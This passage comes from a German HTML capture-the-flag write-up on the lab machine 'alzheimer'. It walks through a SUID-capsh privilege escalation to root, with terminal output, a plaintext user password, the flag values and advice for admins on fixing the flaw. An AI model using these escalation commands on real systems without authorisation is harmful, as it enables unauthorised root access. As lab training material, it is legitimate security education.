+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `medusa` wird `sudo -l` ausgeführt, um die `sudo`-Berechtigungen dieses Benutzers zu überprüfen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Interessantes Ergebnis: Der Benutzer `medusa` darf den Befehl `/bin/id` als jeder Benutzer (`ALL`) ohne Passwort (`NOPASSWD:`) ausführen. Dies ist ungewöhnlich und scheint auf den ersten Blick nicht direkt zur Privilegieneskalation nützlich zu sein, da `id` nur Informationen anzeigt. Allerdings ist es eine Fehlkonfiguration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese spezifische `sudo`-Regel bietet keinen direkten Weg zur Root-Shell. Suche nach anderen Wegen zur Privilegieneskalation, z.B. SUID-Binaries, Kernel-Exploits, Fehlkonfigurationen in Diensten oder Cronjobs. Hole die User-Flag, da sie im Home-Verzeichnis liegt.<br><strong>Empfehlung (Admin):</strong> Entferne diese unnötige und potenziell irreführende `sudo`-Regel. Gewähre `sudo`-Rechte nur nach dem Prinzip der geringsten Rechte.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Remote Prompt -->
+                     <pre>
+medusa@alzheimer:~$ sudo -l
+Matching Defaults entries for medusa on alzheimer:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User medusa may run the following commands on alzheimer:
+    (ALL) NOPASSWD: /bin/id
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `ls -la` listet den detaillierten Inhalt des Home-Verzeichnisses des Benutzers `medusa` auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Neben den üblichen Konfigurationsdateien (`.bashrc`, `.profile` etc.) wird die Datei `user.txt` gefunden. Dies ist die User-Flag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lies den Inhalt von `user.txt` mit `cat user.txt`, um die Flag zu erhalten.<br><strong>Empfehlung (Admin):</strong> Standard-Dateien, keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+medusa@alzheimer:~$ ls -la
+total 32
+drwxr-xr-x 3 medusa medusa 4096 Oct  3  2020 .
+drwxr-xr-x 3 root   root   4096 Oct  2  2020 ..
+-rw-r--r-- 1 medusa medusa  220 Oct  2  2020 .bash_logout
+-rw-r--r-- 1 medusa medusa 3526 Oct  2  2020 .bashrc
+drwxr-xr-x 3 medusa medusa 4096 Oct  3  2020 .local
+-rw-r--r-- 1 medusa medusa  807 Oct  2  2020 .profile
+-rw-r--r-- 1 medusa medusa   19 Oct  3  2020 user.txt
+-rw------- 1 medusa medusa  107 Oct  3  2020 .Xauthority
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `user.txt` wird mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag lautet `<span class="password">HMVrespectmemories</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag notiert. Setze die Suche nach Privilegieneskalation fort.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag-Datei selbst.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+medusa@alzheimer:~$ cat user.txt
+<span class="password">HMVrespectmemories</span>
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, mit Nmap vom Angreifer-System aus zu prüfen, ob die Ports 1000, 2000, 3000 offen sind. Die Optionen `-r` (scan ports sequentially), `--max-retries 0`, `--max-parallelism 1`, `-sT` (TCP Connect Scan), `--scan-delay 200ms` und `-Pn` (Skip Host Discovery) werden verwendet. Dieser Scan scheint zu testen, ob die Knocking-Ports selbst offen sind oder ob das Knocking sie geöffnet hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan zeigt, dass die Ports 1000, 2000 und 3000 `closed` sind. Das bedeutet, das Port Knocking hat nicht diese Ports geöffnet (was auch nicht erwartet wurde), sondern die Ports 22 und 80. Dieser Scan dient wahrscheinlich nur zur Verifizierung oder aus Neugier.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Scan liefert keine neuen Informationen für die Eskalation. Konzentriere dich auf die Enumeration auf dem Zielsystem.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap 192.168.2.113 -p 1000,2000,3000 -r --max-retries 0 --max-parallelism 1 -sT --scan-delay 200ms -Pn</span></div>
+                     <pre>
+Warning: --min-parallelism and --max-parallelism are ignored with --scan-delay.
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-28 01:30 CEST
+Nmap scan report for alzheimer.hmv (192.168.2.113)
+Host is up (0.00021s latency).
+
+PORT     STATE  SERVICE
+1000/tcp closed cadlock
+2000/tcp closed cisco-sccp
+3000/tcp closed ppp
+
+Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `medusa` auf dem Zielsystem wird `find / -type f -perm -4000 -ls 2>/dev/null` ausgeführt. Dies sucht nach Dateien (`-type f`) im gesamten Dateisystem (`/`) mit gesetztem SUID-Bit (`-perm -4000`), listet detaillierte Informationen dazu auf (`-ls`) und unterdrückt Fehlermeldungen (`2>/dev/null`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Liste zeigt die üblichen verdächtigen SUID-Binaries (mount, su, passwd, sudo etc.). Zusätzlich wird `/usr/sbin/capsh` mit SUID-Root-Rechten (`-rwsr-sr-x`) gefunden. `capsh` ist ein Tool zur Verwaltung von Linux Capabilities, kann aber, wenn es SUID-Rechte hat, oft zur Privilegieneskalation missbraucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das SUID-gesetzte `capsh`-Binary ist ein sehr vielversprechender Kandidat für Privilegieneskalation. Suche auf GTFOBins nach Exploits für `capsh` mit SUID-Bit.<br><strong>Empfehlung (Admin):</strong> Entferne das SUID-Bit von `/usr/sbin/capsh`, da es normalerweise nicht benötigt wird und ein Sicherheitsrisiko darstellt (`chmod u-s /usr/sbin/capsh`). Überprüfe regelmäßig SUID/SGID-Binaries auf dem System.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+medusa@alzheimer:/dev/shm$ find / -type f -perm -4000 -ls 2>/dev/null
+     1249     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    15846    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+   137057     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+       60     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
+     8850    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
+     3888     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
+     3415     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
+     3562     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
+       63     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
+       59     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
+     3890     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
+       62     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
+     5584     28 -rwsr-sr-x   1 root     root          26776 Feb  6  2019 /usr/sbin/capsh
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Dies ist eine Referenz auf GTFOBins und der dort beschriebene Exploit für `capsh` mit SUID. Der Befehl `sudo install -m =xs $(which capsh) .` würde versuchen, eine Kopie von `capsh` mit gesetztem SUID-Bit im aktuellen Verzeichnis zu erstellen (benötigt aber `sudo`-Rechte für `install`, die `medusa` nicht hat). Der eigentliche Exploit ist dann `./capsh --gid=0 --uid=0 --`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies zeigt, dass der Pentester die Schwachstelle recherchiert hat und den korrekten Exploit-Pfad von GTFOBins kennt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den Befehl `capsh --gid=0 --uid=0 --` direkt aus (oder `./capsh --gid=0 --uid=0 --` falls eine Kopie erstellt wurde), um Root-Rechte zu erlangen, da `/usr/sbin/capsh` bereits SUID hat.<br><strong>Empfehlung (Admin):</strong> GTFOBins ist eine wertvolle Ressource, um die Risiken von SUID-Binaries und `sudo`-Fehlkonfigurationen zu verstehen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Keine Terminal-Ausgabe, nur eine Referenz -->
+                     <pre>
+https://gtfobins.github.io/gtfobins/capsh/
+sudo install -m =xs $(which capsh) .
+./capsh --gid=0 --uid=0 --
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, den GTFOBins-Befehl `sudo install -m =xs $(which capsh) .` auszuführen, um eine SUID-Kopie von `capsh` zu erstellen. Der Benutzer `medusa` wechselt dazu in das Verzeichnis `/usr/sbin` (was unnötig ist) und führt den Befehl aus. Das Passwort wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Versuch schlägt fehl (`Sorry, user medusa is not allowed to execute...`). Der Benutzer `medusa` hat keine `sudo`-Rechte für den `install`-Befehl. Dieser Schritt war auch unnötig, da `/usr/sbin/capsh` bereits SUID gesetzt hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere den Fehlschlag und fahre mit dem direkten Aufruf von `/usr/sbin/capsh` mit den entsprechenden Parametern fort.<br><strong>Empfehlung (Admin):</strong> Keine Aktion nötig, da der Versuch fehlschlug.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+medusa@alzheimer:/dev/shm$ cd /usr/sbin
+medusa@alzheimer:/usr/sbin$ sudo install -m =xs $(which capsh) .
+
+[sudo] password for medusa: <span class="password">Ihavebeenalwayshere!!!</span>
+
+Sorry, user medusa is not allowed to execute '/usr/bin/install -m =xs /usr/sbin/capsh .' as root on alzheimer.
+                     </pre> <!-- Korrekten Pfad in Fehlermeldung eingesetzt -->
+                 </div>
+             </div>
+        </section>
+
+        <!-- POC beginnt hier -->
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem fehlgeschlagenen `install`-Versuch wird nun `capsh` direkt mit den Parametern von GTFOBins aufgerufen: `./capsh --gid=0 --uid=0 --`. Da `/usr/sbin/capsh` das SUID-Bit gesetzt hat (wie von `find` gezeigt), wird dieser Befehl effektiv mit Root-Rechten ausgeführt. Die Parameter `--gid=0` und `--uid=0` weisen `capsh` an, eine Shell mit der Gruppen-ID 0 (root) und Benutzer-ID 0 (root) zu starten.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Befehl funktioniert wie erwartet. Obwohl er ohne `sudo` ausgeführt wird, nutzt er das SUID-Bit der `capsh`-Datei. Der Prompt wechselt sofort zu `root@alzheimer:/usr/sbin#`, was bestätigt, dass Root-Rechte erlangt wurden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Suche nach der Root-Flag (`/root/root.txt`).<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne das SUID-Bit von `/usr/sbin/capsh` (`chmod u-s /usr/sbin/capsh`). Überprüfe alle SUID/SGID-Binaries auf dem System und entferne unnötige Berechtigungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+medusa@alzheimer:/usr/sbin$ ./capsh --gid=0 --uid=0 --
+root@alzheimer:/usr/sbin#
+                     </pre> <!-- Prompt wechselt zu root -->
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">root@alzheimer:~# cd /root<br>root@alzheimer:/root# cat root.txt</div>
+                     <div class="flag-value"><span class="password">HMVlovememories</span></div>
+                 </div>
+                 <!-- User Flag (aus vorherigem Schritt) -->
+                 <div class="flag-entry">
+                     <div class="flag-command">medusa@alzheimer:~$ cat user.txt</div>
+                     <div class="flag-value"><span class="password">HMVrespectmemories</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap-Scan extrahiert -->
+        <p>Berichtsdatum: 28. Oktober 2022</p>
+    </footer>
+</body>
+</html>
